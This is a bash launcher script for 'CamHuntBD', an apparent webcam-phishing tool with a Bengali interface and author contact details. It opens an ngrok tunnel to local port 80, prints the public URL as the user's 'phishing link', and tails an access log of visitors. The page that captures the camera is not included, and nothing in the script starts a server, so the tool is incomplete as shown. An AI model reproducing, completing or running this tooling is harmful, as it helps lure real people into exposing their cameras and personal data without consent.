#!/bin/bash

# CamHuntBD - Advanced Bengali CamPhish Tool by Safwan
# Features: Bengali UI, red color theme, mysterious tagline,
# developer info, ngrok auth, real-time logging, sound effect

RED='\033[0;31m'
NC='\033[0m' # No Color

clear
echo -e "${RED}"
echo "         ██████╗  █████╗ ███╗   ███╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗"
echo "        ██╔════╝ ██╔══██╗████╗ ████║██║ ██╔╝██║   ██║████╗  ██║╚══██╔══╝"
echo "        ██║  ███╗███████║██╔████╔██║█████╔╝ ██║   ██║██╔██╗ ██║   ██║   "
echo "        ██║   ██║██╔══██║██║╚██╔╝██║██╔═██╗ ██║   ██║██║╚██╗██║   ██║   "
echo "        ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██╗╚██████╔╝██║ ╚████║   ██║   "
echo "         ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   "
echo
echo "           \"দৃষ্টি যখন ফাঁদে, পালানোর পথ নেই...\""
echo "                Tool by: Safwan"
echo "        Telegram: @Safwan_al_sadaf"
echo "  Facebook: facebook.com/share/15kFDb1uXr/"
echo -e "${NC}"

# Check if mpv or termux-media-player is installed for sound
if command -v mpv >/dev/null 2>&1; then
    SOUND_PLAYER="mpv"
elif command -v termux-media-player >/dev/null 2>&1; then
    SOUND_PLAYER="termux-media-player"
else
    SOUND_PLAYER=""
fi

# Play scary sound effect (if available)
play_sound() {
    if [ -n "$SOUND_PLAYER" ]; then
        # Use a default scary sound URL or local file if added later
        # For demo, no sound file included
        # You can download a scary sound and put it here or stream from URL
        echo -e "${RED}[সতর্কতা] সাউন্ড ইফেক্ট প্লে হচ্ছে...${NC}"
        # $SOUND_PLAYER scary_sound.mp3 &
    fi
}

# Ngrok check and setup
if ! command -v ngrok >/dev/null 2>&1; then
    echo -e "${RED}Ngrok ইনস্টল নেই! প্রথমে ইনস্টল করুন।${NC}"
    exit 1
fi

# Start ngrok tunnel on port 80
echo -e "${RED}Ngrok টানেল শুরু হচ্ছে... অপেক্ষা করুন...${NC}"
ngrok http 80 > /dev/null 2>&1 &

sleep 5

# Fetch public URL from ngrok
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io')

if [ -z "$NGROK_URL" ]; then
    echo -e "${RED}Ngrok URL পাওয়া যায়নি! আবার চেষ্টা করুন।${NC}"
    exit 1
fi

echo -e "${RED}আপনার ফিশিং লিঙ্কঃ $NGROK_URL${NC}"

play_sound

echo -e "${RED}ব্যবহারকারী লগ ডিরেক্টরিঃ ./logs${NC}"
mkdir -p logs

echo -e "${RED}লগ মনিটরিং শুরু হচ্ছে... Ctrl+C দিয়ে বন্ধ করুন।${NC}"
tail -f ./logs/access.log